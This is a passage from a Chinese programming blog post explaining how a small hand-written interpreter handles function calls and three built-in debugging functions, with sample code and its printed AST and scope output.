<p>在 <code>interpretFunCallAST</code> 会设置 <code>fnAST.option = &quot;run&quot;</code> 并再次调用 <code>interpretAST</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">childScope.set(<span class="string">&quot;arguments&quot;</span>,argument,ASTNodeTypes.T_ARGUMENT);</span><br><span class="line"><span class="keyword">let</span> fnAST = scope.get(astNode.value).value;</span><br><span class="line">fnAST.option = <span class="string">&quot;run&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> interpretAST(fnAST,<span class="literal">null</span>,childScope);</span><br></pre></td></tr></table></figure>
<p>再次调用 <code>interpretAST</code> 会进入 <code>ASTNodeTypes.T_FUN</code> 分支，并尝试解析该函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ASTNodeTypes.T_FUN:</span><br><span class="line">    <span class="keyword">if</span>(astNode.option === <span class="string">&quot;run&quot;</span>)&#123;</span><br><span class="line">        astNode.option = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        scope.add(astNode.value);</span><br><span class="line">        scope.set(astNode.value,astNode,ASTNodeTypes.T_FUN);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>若条件 <code>astNode.option === &quot;run&quot;</code> 成立，则代表了解释器遇到了函数调用，需要知道该函数的具体实现</li>
<li>否则代表解释器遇到了一个新的函数，并将该函数记录在了 <code>scope</code> 中</li>
</ul>
<p>后续的操作和处理 block 是相同的，整个过程的结果将会记录在 Scope 中并参与后续的解析</p>
<p><strong>内置函数的设计</strong></p>
<p>这里我一共写了3个内置函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logIn</span>(<span class="params">...argument</span>)</span>&#123; <span class="comment">/* 等同于console.log */</span></span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">let</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">typeof</span> argument[i] !== <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">        arr.push(argument[i] ? argument[i].value : argument[i]);</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(...arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showIn</span>(<span class="params">argument</span>)</span>&#123; <span class="comment">/* 打印Scope结构体数据 */</span></span><br><span class="line">    <span class="built_in">console</span>.log(argument);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">treeIn</span>(<span class="params">argument</span>)</span>&#123; <span class="comment">/* 打印astNode树形结构 */</span></span><br><span class="line">    printTree(argument.astnode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> c = add(a,b);</span><br><span class="line"></span><br><span class="line">tree(add);</span><br><span class="line">show(a);</span><br><span class="line">show(b);</span><br><span class="line">log(<span class="string">&quot;result is :&quot;</span>,c);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> ──[function] (add)</span><br><span class="line">     │  </span><br><span class="line">     ├──[_glue] (null)</span><br><span class="line">     │   │  </span><br><span class="line">     │   ├──[argument] (a)</span><br><span class="line">     │   │  </span><br><span class="line">     │   └──[argument] (b)</span><br><span class="line">     │      </span><br><span class="line">     └──[<span class="keyword">return</span>] (null)</span><br><span class="line">         │  </span><br><span class="line">         └──[+] (null)</span><br><span class="line">             │  </span><br><span class="line">             ├──[identifier] (a)</span><br><span class="line">             │  </span><br><span class="line">             └──[identifier] (b)</span><br><span class="line">                </span><br><span class="line">&#123;</span><br><span class="line">  _inner: <span class="literal">true</span>,</span><br><span class="line">  name: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  value: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">  type: <span class="string">&#x27;string&#x27;</span>,</span><br><span class="line">  astnode: ASTNode &#123;</span><br><span class="line">    left: null,</span><br><span class="line">    mid: null,</span><br><span class="line">    right: null,</span><br><span class="line">    op: <span class="string">&#x27;leftValue&#x27;</span>,</span><br><span class="line">    value: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    option: null</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  _inner: <span class="literal">true</span>,</span><br><span class="line">  name: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">  value: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">  type: <span class="string">&#x27;string&#x27;</span>,</span><br><span class="line">  astnode: ASTNode &#123;</span><br><span class="line">    left: null,</span><br><span class="line">    mid: null,</span><br><span class="line">    right: null,</span><br><span class="line">    op: <span class="string">&#x27;leftValue&#x27;</span>,</span><br><span class="line">    value: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    option: null</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">result is : ab</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/31/">31</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">305</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">156</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">65:48</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
